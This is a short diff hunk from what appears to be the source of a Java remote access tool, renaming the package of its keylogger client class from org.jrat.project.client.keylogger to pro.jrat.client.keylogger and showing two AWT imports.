@@ -1,4 +1,4 @@
-package org.jrat.project.client.keylogger;
+package pro.jrat.client.keylogger;
 
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
